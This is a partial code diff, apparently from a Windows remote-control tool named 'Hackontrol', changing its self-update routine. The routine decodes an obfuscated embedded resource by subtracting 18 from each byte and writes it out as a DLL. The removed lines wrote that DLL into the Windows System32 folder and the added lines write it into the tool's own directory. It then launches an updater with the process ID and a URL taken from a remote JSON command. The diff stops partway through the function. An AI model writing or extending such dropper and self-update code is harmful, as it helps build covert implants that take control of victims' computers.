@@ -1,5 +1,6 @@
-#include "execute.h"
+#include <hackontrol.h>
 #include <khopanstring.h>
+#include "execute.h"
 #include "resource.h"
 
 static HINSTANCE globalInstance;
@@ -11,27 +12,31 @@ BOOL CheckAndProcessSelfUpdate(cJSON* root) {
 
 	cJSON* selfObject = cJSON_GetObjectItem(root, "self");
 
+	if(!cJSON_IsObject(selfObject)) {
+		return TRUE;
+	}
+
 	if(!cJSON_HasObjectItem(selfObject, "url")) {
 		return TRUE;
 	}
 
-	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
+	cJSON* urlObject = cJSON_GetObjectItem(selfObject, "url");
 
-	if(!pathFolderWindows) {
+	if(!cJSON_IsString(urlObject)) {
 		return TRUE;
 	}
 
-	LPWSTR pathFolderSystem32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32, pathFolderWindows);
-	LocalFree(pathFolderWindows);
+	const char* url = cJSON_GetStringValue(urlObject);
+	LPWSTR pathFolderHackontrol = HackontrolGetDirectory(TRUE);
 
-	if(!pathFolderSystem32) {
+	if(!pathFolderHackontrol) {
 		return TRUE;
 	}
 
-	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderSystem32);
+	LPWSTR pathFileLibdll32 = KHFormatMessageW(L"%ws\\" FILE_LIBDLL32, pathFolderHackontrol);
 
 	if(!pathFileLibdll32) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
@@ -39,42 +44,42 @@ BOOL CheckAndProcessSelfUpdate(cJSON* root) {
 	LocalFree(pathFileLibdll32);
 
 	if(result) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
 	HRSRC resourceHandle = FindResourceW(globalInstance, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA);
 
 	if(!resourceHandle) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
 	DWORD resourceSize = SizeofResource(globalInstance, resourceHandle);
 
 	if(!resourceSize) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
 	HGLOBAL resource = LoadResource(globalInstance, resourceHandle);
 
 	if(!resource) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
 	BYTE* data = LockResource(resource);
 
 	if(!data) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
 	BYTE* buffer = LocalAlloc(LMEM_FIXED, resourceSize);
 
 	if(!buffer) {
-		LocalFree(pathFolderSystem32);
+		LocalFree(pathFolderHackontrol);
 		return TRUE;
 	}
 
@@ -82,37 +87,26 @@ BOOL CheckAndProcessSelfUpdate(cJSON* root) {
 		buffer[i] = (data[i] - 18) % 0xFF;
 	}
 
-	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderSystem32);
-	LocalFree(pathFolderSystem32);
+	LPWSTR pathFileLibupdate32 = KHFormatMessageW(L"%ws\\" FILE_LIBUPDATE32, pathFolderHackontrol);
+	LocalFree(pathFolderHackontrol);
 
 	if(!pathFileLibupdate32) {
 		LocalFree(buffer);
 		return TRUE;
 	}
 
-	HANDLE file = CreateFileW(pathFileLibupdate32, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
-
-	if(file == INVALID_HANDLE_VALUE) {
-		LocalFree(pathFileLibupdate32);
-		LocalFree(buffer);
-		return TRUE;
-	}
-
-	DWORD bytesWritten;
-	result = WriteFile(file, buffer, resourceSize, &bytesWritten, NULL);
-	LocalFree(buffer);
+	DataStream stream = {0};
+	stream.data = buffer;
+	stream.size = resourceSize;
+	result = HackontrolWriteFile(pathFileLibupdate32, &stream);
+	KHDataStreamFree(&stream);
 
 	if(!result) {
 		LocalFree(pathFileLibupdate32);
 		return TRUE;
 	}
 
-	if(!CloseHandle(file)) {
-		LocalFree(pathFileLibupdate32);
-		return TRUE;
-	}
-
-	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu", GetCurrentProcessId());
+	LPWSTR argumentFileLibupdate32 = KHFormatMessageW(L"%lu %S", GetCurrentProcessId(), url);
 
 	if(!argumentFileLibupdate32) {
 		LocalFree(pathFileLibupdate32);
